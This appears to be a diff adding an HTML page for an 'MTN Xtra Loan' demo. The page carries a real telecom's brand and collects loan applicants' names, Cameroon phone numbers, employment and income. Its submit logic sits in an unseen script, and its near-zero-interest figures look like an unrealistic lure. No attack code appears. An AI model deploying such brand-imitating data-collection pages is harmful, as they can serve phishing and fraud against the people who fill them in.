@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN Xtra Loan Demo</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- LANGUAGE SELECTION SCREEN -->
+    <div id="screen-language" class="screen active">
+        <div class="language-card">
+            <h2>Choose your language</h2>
+            <p>Select your language to continue</p>
+            <button class="lang-btn" onclick="selectLanguage('en')">🇬🇧 English</button>
+            <button class="lang-btn" onclick="selectLanguage('fr')">🇫🇷 Français</button>
+            <button class="lang-btn" onclick="selectLanguage('cm')">🇨🇲 Camfranglais</button>
+        </div>
+    </div>
+
+    <!-- HOME / CALCULATOR SCREEN -->
+    <div id="screen-home" class="screen">
+        <header>
+            <h1>MTN Xtra Loan</h1>
+            <p>Easy Loan</p>
+        </header>
+        
+        <div class="content-card">
+            <h3>Welcome to MTN Xtra Loan</h3>
+            <p>Get loans easily through MTN Xtra Loan Cameroon</p>
+            
+            <div class="calculator">
+                <h4>Loan Calculator</h4>
+                <label>Amount (XAF)</label>
+                <input type="range" id="amount-slider" min="500000" max="5000000" step="100000" value="1000000">
+                <div class="slider-labels"><span>500k</span><span>5M</span></div>
+                <div class="calc-display">XAF <span id="loan-amount-display">1,000,000</span></div>
+
+                <label>Term</label>
+                <select id="term-select">
+                    <option value="12">12 Months</option>
+                    <option value="24">24 Months</option>
+                    <option value="36">36 Months</option>
+                    <option value="48" selected>48 Months</option>
+                </select>
+
+                <div class="monthly-payment">
+                    <p>Monthly Payment</p>
+                    <h2>XAF <span id="monthly-payment-display">20,834</span></h2>
+                </div>
+            </div>
+
+            <button class="primary-btn" onclick="goToScreen('screen-application')">START APPLICATION</button>
+        </div>
+    </div>
+
+    <!-- APPLICATION FORM SCREEN (3 STEPS) -->
+    <div id="screen-application" class="screen">
+        <header>
+            <h1>MTN Xtra Loan</h1>
+            <p>Loans</p>
+        </header>
+
+        <div class="content-card">
+            <div class="form-header">
+                <h3>Loan Application</h3>
+                <p id="step-indicator">Step 1 of 3</p>
+            </div>
+
+            <form id="loan-form" onsubmit="submitForm(event)">
+                <!-- STEP 1 -->
+                <div id="step-1" class="form-step active">
+                    <label>Loan Type</label>
+                    <select id="loan-type">
+                        <option>Business Loan</option>
+                        <option>Personal Loan</option>
+                        <option>Emergency Loan</option>
+                        <option>Education Loan</option>
+                    </select>
+
+                    <label>Loan Amount (XAF)</label>
+                    <input type="number" id="form-amount" value="1000000" min="500000" max="5000000">
+
+                    <label>Loan Term</label>
+                    <select id="form-term">
+                        <option value="12">12 Months</option>
+                        <option value="24">24 Months</option>
+                        <option value="36">36 Months</option>
+                        <option value="48" selected>48 Months</option>
+                    </select>
+
+                    <label>Purpose of Loan</label>
+                    <input type="text" id="form-purpose" placeholder="e.g., Business expansion">
+                </div>
+
+                <!-- STEP 2 -->
+                <div id="step-2" class="form-step">
+                    <label>First Name</label>
+                    <input type="text" id="first-name" placeholder="John">
+
+                    <label>Last Name</label>
+                    <input type="text" id="last-name" placeholder="Doe">
+
+                    <label>Phone Number (Cameroon)</label>
+                    <div class="phone-input">
+                        <span>+237</span>
+                        <input type="tel" id="phone-number" placeholder="670123456" pattern="[0-9]{9}" title="9 digits without +237 prefix">
+                    </div>
+                    <small>9 digits without +237 prefix (e.g., 670123456)</small>
+                </div>
+
+                <!-- STEP 3 -->
+                <div id="step-3" class="form-step">
+                    <label>Employment Status</label>
+                    <select id="employment-status">
+                        <option>Self-employed</option>
+                        <option>Employed full-time</option>
+                        <option>Employed part-time</option>
+                        <option>Student</option>
+                        <option>Unemployed</option>
+                    </select>
+
+                    <label>Annual Income (XAF)</label>
+                    <input type="number" id="annual-income" placeholder="e.g., 5000000">
+
+                    <div class="summary-box">
+                        <h4>Application Summary</h4>
+                        <p>Loan Amount: <span id="summary-amount">XAF 1,000,000</span></p>
+                        <p>Loan Term: <span id="summary-term">48 Months</span></p>
+                        <p>Purpose: <span id="summary-purpose">—</span></p>
+                        <p>Applicant: <span id="summary-name">—</span></p>
+                    </div>
+                </div>
+
+                <!-- BUTTONS -->
+                <div class="form-navigation">
+                    <button type="button" id="btn-back" class="secondary-btn" onclick="prevStep()" style="display: none;">BACK</button>
+                    <button type="button" id="btn-next" class="primary-btn" onclick="nextStep()">NEXT STEP</button>
+                    <button type="submit" id="btn-submit" class="primary-btn" style="display: none;">SUBMIT APPLICATION</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- SUCCESS SCREEN -->
+    <div id="screen-success" class="screen">
+        <div class="content-card text-center">
+            <h2>Processing Application</h2>
+            <p>Please wait, this may take a few seconds</p>
+            <div class="spinner"></div>
+            <h3 style="margin-top: 20px; color: #ffcc00;">Success!</h3>
+            <p>Your application has been received.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
